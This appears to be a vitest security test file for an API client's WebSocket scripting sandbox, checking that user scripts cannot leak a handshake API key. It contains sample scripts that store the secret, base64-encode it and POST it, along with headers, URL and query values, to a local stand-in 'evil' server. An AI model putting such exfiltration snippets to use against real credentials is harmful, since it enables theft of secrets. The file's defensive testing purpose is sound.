import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';

import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import {
    startEchoServer,
    type EchoServer,
} from '../../../../../../packages/transport-async/tests/support/echo-server.js';
import { waitFor } from '../../../../../../packages/transport-async/tests/support/wait-for.js';
import { SECRET, startScriptSockets, type ScriptSockets } from './support/script-sockets.js';

// A server that hands the secret of the handshake back in a frame: what a script makes of it.

let sockets: ScriptSockets;
let echo: EchoServer;
let evil: { url: string; bodies: string[]; server: Server };

/** Every spelling of the secret a thief could carry it in. */
const SPELLINGS = [SECRET, Buffer.from(SECRET).toString('base64'), encodeURIComponent(SECRET)];

function carries(text: string): boolean {
    return SPELLINGS.some((spelling) => text.includes(spelling));
}

async function startEvil(): Promise<typeof evil> {
    const bodies: string[] = [];
    const server = createServer((request, response) => {
        const chunks: Buffer[] = [];

        request.on('data', (chunk: Buffer) => chunks.push(chunk));
        request.on('end', () => {
            bodies.push(`${request.url ?? ''}\n${Buffer.concat(chunks).toString('utf8')}`);
            response.end('ok');
        });
    });

    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));

    return {
        url: `http://127.0.0.1:${String((server.address() as AddressInfo).port)}`,
        bodies,
        server,
    };
}

function websocket(scripts: Record<string, string>) {
    return {
        transport: 'websocket',
        template: { url: echo.url, headers: { 'X-Api-Key': '{{token}}' } },
        scripts: Object.fromEntries(
            Object.entries(scripts).map(([event, source]) => [event, { source }]),
        ),
    };
}

beforeEach(async () => {
    sockets = await startScriptSockets();
    echo = await startEchoServer();
    evil = await startEvil();
});

afterEach(async () => {
    await sockets.stop();
    await echo.close();
    evil.server.closeAllConnections();
    await new Promise((resolve) => evil.server.close(resolve));
});

describe('a frame that brings the secret of the handshake back', () => {
    it('reaches onMessage hidden, so no value of a script keeps it for a later send', async () => {
        await expect(
            sockets.open(
                websocket({
                    onMessage: [
                        'mandor.variables.set("stolen", String(mandor.message.text));',
                        'mandor.variables.set("coded", btoa(String(mandor.message.text)));',
                        'console.log("frame-ran");',
                    ].join('\n'),
                }),
            ),
        ).resolves.toMatchObject({ ok: true });
        // The handshake did carry the secret: the server is the one the person trusts.
        expect(echo.lastHeaders()['x-api-key']).toBe(SECRET);

        echo.broadcastText(`your key is ${SECRET}`);
        await waitFor(() => {
            expect(sockets.notes.some((note) => note.event === 'onMessage')).toBe(true);
        });

        await sockets.close();
        await sockets.open(
            websocket({
                onConnect: `
                    await mandor.sendRequest({ url: '${evil.url}/plain', method: 'POST', body: String(mandor.variables.get('stolen')) });
                    await mandor.sendRequest({ url: '${evil.url}/coded', method: 'POST', body: String(mandor.variables.get('coded')) });
                `,
            }),
        );
        await waitFor(() => {
            expect(evil.bodies).toHaveLength(2);
        });

        expect(evil.bodies.filter(carries)).toEqual([]);
        expect(JSON.stringify(sockets.notes)).not.toContain(SECRET);
    });

    it('reads no secret out of the handshake the person wrote, before it opens', async () => {
        await sockets.open({
            transport: 'websocket',
            template: { url: `${echo.url}?k={{token}}`, headers: { 'X-Api-Key': '{{token}}' } },
            scripts: {
                onBeforeConnect: {
                    source: `
                        const read = {
                            header: mandor.request.headers.get('x-api-key'),
                            url: mandor.request.url,
                            query: mandor.request.query.get('k'),
                            replaced: mandor.variables.replaceIn('{{token}}'),
                        };
                        for (const [name, value] of Object.entries(read)) {
                            await mandor.sendRequest({ url: '${evil.url}/' + name, method: 'POST', body: String(value) });
                        }
                    `,
                },
            },
        });

        expect(evil.bodies).toHaveLength(4);
        expect(evil.bodies.filter(carries)).toEqual([]);
    });
});
